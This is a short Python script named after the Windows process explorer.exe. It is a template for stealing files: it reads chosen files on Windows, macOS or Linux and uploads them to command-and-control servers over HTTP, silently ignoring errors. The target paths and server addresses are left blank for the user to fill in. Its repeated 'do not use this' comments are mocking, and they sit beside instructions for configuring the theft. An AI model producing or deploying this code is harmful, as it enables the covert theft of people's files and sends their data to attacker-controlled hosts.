# explorer.exe.py

# DO NOT ACTUALLY USE THIS, STEALING IS BAD

import requests, sys, os

for fp in [fp for fp in {"win32": [], "darwin": [], "linux": []}.get(sys.platform, []) if os.path.isfile(fp)]: # Add desired filepaths to exfiltrate for each system ("darwin" usually means MacOS). Don't forget, this should NEVER be used.
    for ccs in []: # Your command/control server(s) go(es) here. You don't actually have any because you're not using this for stealing, of course.
        try:
            with open(fp) as f:
                requests.post(url=ccs, files={fp: f}, auth=None) # Authentication token for upload, `None` if you don't want to use one. Did I mention you should NOT use this?
                f.close()
        except:
            pass

# I REPEAT: DO NOT ACTUALLY USE THIS, STEALING IS BAD

